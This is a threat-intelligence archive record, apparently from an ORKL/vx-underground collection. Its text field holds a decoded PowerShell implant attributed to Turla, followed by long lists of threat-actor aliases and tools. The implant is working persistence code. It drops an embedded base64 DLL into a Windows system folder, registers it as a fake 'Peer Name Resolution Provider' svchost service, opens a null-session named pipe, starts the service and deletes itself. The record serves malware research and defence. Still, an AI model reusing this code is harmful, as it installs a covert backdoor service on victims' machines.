{
    "id": "a5db866a-2d59-462f-abcb-73f084afa80f",
    "created_at": "2023-01-12T15:03:07.508448Z",
    "updated_at": "2025-03-27T02:16:21.019267Z",
    "deleted_at": null,
    "sha1_hash": "32c2fdcb171d90bc9dfefb2ee598d72e9d786450",
    "title": "2019-04-13 - Decoded Turla Powershell Implant",
    "authors": "",
    "file_creation_date": "2022-05-28T04:40:40Z",
    "file_modification_date": "2022-05-28T04:40:40Z",
    "file_size": 50993,
    "plain_text": "// @VK_INTEL\n\n// MD5: 165be7620b78fe37cf25c797ee5b49e7\n\n// POSSIBLE TURLA DECODED POWERSHELL IMPLANT\n\n/*\n\nGENERAL FLOW:\n\nFindAmsiFun() -> Zip -> PowerSploit-Encoded ->\n\nC:\\Windows\\security\\database\\securlsa.chk serveName 'pnrss' & pipeName = 'pnrsvc' Persistence\n\nPowerShellRunner.dll\n\n*/\n\n/*\n\nBASE64 POWERSHELLRUNNER\n\n$LDD761jbd =\n\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAA4fug4AtAnNIbgBT\n*/\n\nSet-Content 'C:\\Windows\\security\\database\\securlsa.chk' -Value $([Convert]::FromBase64String($LDD761jbd)) -Encoding Byte;\n\n[string]$servName='pnrssp';\n\n[string]$fileName='securlsa.chk';\n\n[string]$pipeName = 'pnrsvc';\n\nfunction Reg-SetMS($registry, [string]$valueName, [string]$value)\n\n{\n\n[string[]]$array = $registry.GetValue($valueName)\n\nIf ($array -notcontains $value) {\n\n$array += $value\n\n$registry.SetValue($valueName, $array, 'MultiString')\n\n}\n}\n\nfunction Reg-DelMS($registry, [string]$valueName, $value)\n\n{\n$array = $registry.GetValue($valueName)\n\n[string[]]$newarray = $array -ne $value\n\n$registry.SetValue($valueName, $newarray, 'MultiString')\n\n}\n\nfunction Install([string]$servName, [string]$fileName, [string]$pipeName)\n\n{\n$serviceMain = \"ServiceMain\"\n\n$serviceDll = \"ServiceDLL\"\n\nNew-Service -Name $servName -BinaryPathName \"%SystemRoot%\\system32\\svchost.exe -k netsvcs\" -DisplayName \"Peer Name Resolution\nProvider\" -DependsOn \"RpcSs\" `\n\n-Description \"Uses the NTLM MS-CHAP protocol to encapsulate and negotiate options in order to resolve domain names\"\n\n$registry = (Get-Item -Path Registry::HKLM).OpenSubKey(\"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\", $true)\n\nReg-SetMS $registry \"netsvcs\" $servName\n\n$registry.Close()\n\n$registry = (Get-Item -Path Registry::HKLM).OpenSubKey(\"SYSTEM\\CurrentControlSet\\services\\$servName\",\n$True).CreateSubKey(\"Parameters\")\n\n$registry.SetValue($serviceMain, $serviceMain, 'String')\n\n$registry.SetValue($serviceDll, $env:SystemRoot + '\\security\\database\\' + $fileName, 'ExpandString')\n\n$registry.Close()\n\nif ($pipeName -ne $null)\n\n\n-----\n\n{\n$registry = (Get-Item -Path Registry::HKLM).OpenSubKey(\"SYSTEM\\CurrentControlSet\\services\\LanmanServer\\Parameters\", $True)\nReg-SetMS $registry \"NullSessionPipes\" $pipeName\n$registry.Close()\n}\n\nStart-Service -Name $servName\n}\n\ntry\n{\nInstall $servName $fileName $pipeName\n\necho \"Success\"\n}\ncatch\n{\necho \"Exception Type: $($_.Exception.GetType().FullName)\"\necho \"Exception Message: $($_.Exception.Message)\"\n}\n\nRemove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-04-13 - Decoded Turla Powershell Implant.pdf"
    ],
    "report_names": [
        "2019-04-13 - Decoded Turla Powershell Implant.pdf"
    ],
    "threat_actors": [
        {
            "id": "870f6f62-84f5-48ca-a18e-cf2902cd6924",
            "created_at": "2022-10-25T15:50:23.303818Z",
            "updated_at": "2025-03-27T02:00:55.435309Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "APT32",
                "SeaLotus",
                "OceanLotus",
                "APT-C-00",
                "Canvas Cyclone"
            ],
            "source_name": "MITRE:APT32",
            "tools": [
                "Mimikatz",
                "ipconfig",
                "Kerrdown",
                "Cobalt Strike",
                "SOUNDBITE",
                "OSX_OCEANLOTUS.D",
                "KOMPROGO",
                "netsh",
                "RotaJakiro",
                "PHOREAL",
                "Arp",
                "Denis",
                "Goopy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535787,
    "ts_updated_at": 1743041781,
    "ts_creation_date": 1653712840,
    "ts_modification_date": 1653712840,
    "files": {
        "pdf": "https://archive.orkl.eu/32c2fdcb171d90bc9dfefb2ee598d72e9d786450.pdf",
        "text": "https://archive.orkl.eu/32c2fdcb171d90bc9dfefb2ee598d72e9d786450.txt",
        "img": "https://archive.orkl.eu/32c2fdcb171d90bc9dfefb2ee598d72e9d786450.jpg"
    }
}